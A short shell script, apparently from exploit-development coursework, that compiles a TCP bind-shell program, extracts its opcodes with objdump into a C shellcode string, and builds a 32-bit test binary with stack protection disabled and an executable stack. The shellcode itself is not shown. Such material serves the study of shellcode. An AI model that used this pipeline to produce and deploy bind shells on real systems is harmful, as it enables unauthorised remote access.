./compile.sh shell_bind_tcp

payload=$(objdump -d shell_bind_tcp|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g')
cp shellcode_template.c shellcode.c
payload2=$(echo $payload | sed "s/\\\/\\\\\\\/g")
sed  -i "s/XXX/$payload2/g" shellcode.c


gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode
